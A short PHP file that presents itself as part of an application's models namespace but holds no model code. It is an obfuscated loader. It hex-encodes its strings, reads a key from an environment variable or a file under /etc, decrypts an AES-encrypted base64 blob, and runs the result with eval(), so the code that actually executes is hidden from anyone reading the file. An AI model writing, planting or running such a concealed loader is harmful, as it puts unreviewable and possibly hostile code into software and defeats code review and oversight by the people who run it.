<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('LDddmYJIYVmrpvFkwhQSWA==');

$c=base64_decode(

'HbWFdjU/vbOTVa1djkL363vl0X2o7ju7iR/Cquw9ZQ3HVLl4UuZXl4PtZp8ge2waDNkMF0rgtKpZ' .
'rxX9Rf3tIKYRcA7QdAQh2X25h99+8bn6HFdCK/OvNfqdn2RmeuP65UQT49yvcd7k2CKatAMSPGQb' .
'dYUWfKBlD8qP3lC1GZRawKarCCU/yKgd0YAvy2bWHPPz1Il5oaoentoh6BJpEDaAo84HgNrLqoQX' .
'TJLnoXNZdbyBUDbZ+0Syl//d2z9ZN1zXn4vUVJhSGGb6pKtJZkTUiVdmIxYuUQ/oF/Y3xOke/2yD' .
'xylHkevtjQxBHax5gpX8lUQLvO24IBn/3xrDzhXW1BMk82j9Rdi17S1wU7fsT1bv3Q3KZYgYb6Sr' .
'2Ed1iiEytTXE3GvqDVeQ/qJiyMRYSvpx451o38adIhhHLhT724VdyOy9g6cDXJLRZqO851kLRxYp' .
'FAa7ZSnUlbKRmVUy1acuGhOjlvJxE5BRps2bdPsvcIbBJ4MDKnxgDNzc/nf8KiIxwIMkMNm9YV2V' .
'7ee1MfEaZxllI4qqM4pPre8kkhrW45Wwv+E8j2mhQlLb89r0oZ5qKDrtOyf1Pwp1BIwOxejymCgz' .
'+r3e11BA4WsyQxmMJhOENXioHExQuofyqbKLktCSrFTbmFUQPJ053sGLQghox7gEgMzos5vi7tsb' .
'+sWbd1Shg16ThHeGOE5iYn1I3uaS6w3oBdD+5meffk93qxZK6K/YZkWXW+R+ZRQXEQJ/3FcssCqA' .
'PZ91mh/EFlsseRV/2wY2BrdQiWdo3A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

